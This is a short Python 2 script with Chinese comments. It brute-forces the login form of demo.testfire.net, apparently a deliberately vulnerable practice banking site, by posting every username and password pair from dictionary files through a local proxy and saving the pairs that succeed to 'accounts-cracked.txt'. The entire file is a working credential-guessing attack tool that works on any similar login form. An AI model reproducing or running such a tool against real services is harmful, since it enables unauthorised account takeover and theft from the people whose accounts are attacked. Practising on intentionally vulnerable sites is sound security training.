# -*- coding: utf-8 -*-
import urllib
import httplib
import re

headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
           "Content-Type": "application/x-www-form-urlencoded",
           "Referer": "http://demo.testfire.net/bank/login.aspx"}
def brute_force(user, password):


    user = user.strip()
    passwd = password.strip()
    conn = httplib.HTTPConnection("localhost","8080")  # 代理
    data = {'uid': user, 'passw': passwd,'btnSubmit':'Login'}
    params = urllib.urlencode(data)
    page = conn.request("POST", "http://demo.testfire.net/bank/login.aspx", params, headers=headers)  # request页面
    response = conn.getresponse()#返回的页面
    status = response.status
    if status==302:
        print '---- find user:', user, ' with password:',passwd, '-----'+'\n'
        outFile.write(user + ':' + passwd + '\n')
    else:
        print '----- error user:', user, ' with password:',passwd, '-----'
    return


outFile = open('accounts-cracked.txt', 'w')

if __name__ == '__main__':
    with open('user.dic', 'r') as userline:
        y = userline.readlines()
        with open('pass.dic', 'r') as passline:
            b= passline.readlines()
            for u in y:
                for p in b:
                    brute_force(user=u,password=p)
outFile.close()
with open('accounts-cracked.txt','r') as text:
    list = text.readlines()
    sum=len(list)

if sum>0:
    print "找到",sum,"个账号密码"
else:
    print "All thread OK,maybe not "
